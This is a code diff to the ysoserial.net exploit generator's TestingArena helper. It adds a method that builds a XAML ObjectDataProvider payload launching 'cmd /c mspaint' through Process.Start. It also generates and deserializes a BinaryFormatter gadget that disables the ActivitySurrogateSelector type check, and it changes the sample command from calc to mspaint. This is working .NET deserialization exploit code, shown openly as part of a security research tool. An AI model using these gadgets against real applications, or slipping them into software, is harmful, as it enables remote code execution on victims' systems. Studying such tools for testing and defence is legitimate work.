@@ -25,7 +25,7 @@ namespace ysoserial.Helpers.TestingArena
     class TestingArenaHome : GenericGenerator
     {
         private InputArgs inputArgs = new InputArgs();
-        private InputArgs sampleInputArgs = new InputArgs("cmd /c calc", true, false, false, false, true, null);
+        private InputArgs sampleInputArgs = new InputArgs("cmd /c mspaint", true, false, false, false, true, null);
         private string testarg = "";
 
         public override OptionSet Options()
@@ -51,7 +51,41 @@ namespace ysoserial.Helpers.TestingArena
             //TextFormatterMinifying();
             //ActivitySurrogateSelector();
             //SpoofByBinaryFormatterJson();
-            Console.ReadLine();
+            //DisableActivitySurrogateSelectorTypeCheckReader();
+            
+            //Console.ReadLine();
+        }
+
+        private void DisableActivitySurrogateSelectorTypeCheckReader()
+        {
+            Console.WriteLine("Before - disableActivitySurrogateSelectorTypeCheck: " + System.Configuration.ConfigurationManager.AppSettings.Get("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"));
+
+            var payload = @"<ObjectDataProvider MethodName=""Start"" IsInitialLoadEnabled=""False"" xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
+  <ObjectDataProvider.ObjectInstance>
+    <sd:Process>
+      <sd:Process.StartInfo>
+        <sd:ProcessStartInfo Arguments=""/c mspaint"" StandardErrorEncoding=""{x:Null}"" StandardOutputEncoding=""{x:Null}"" UserName="""" Password=""{x:Null}"" Domain="""" LoadUserProfile=""False"" FileName=""cmd"" />
+      </sd:Process.StartInfo>
+    </sd:Process>
+  </ObjectDataProvider.ObjectInstance>
+</ObjectDataProvider>";
+
+
+            sampleInputArgs = new InputArgs("cmd /c mspaint", true, false, true, false, true, new List<string>() { "--var", "2" });
+
+            var serialized = (byte[]) new ActivitySurrogateDisableTypeCheckGenerator().GenerateWithInit("BinaryFormatter", sampleInputArgs);
+
+            try
+            {
+                SerializersHelper.BinaryFormatter_deserialize(serialized);
+            }
+            catch(Exception e)
+            {
+
+            }
+
+            Console.WriteLine("After - disableActivitySurrogateSelectorTypeCheck: " + System.Configuration.ConfigurationManager.AppSettings.Get("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"));
+
         }
 
         private class RestrictiveBinder : SerializationBinder
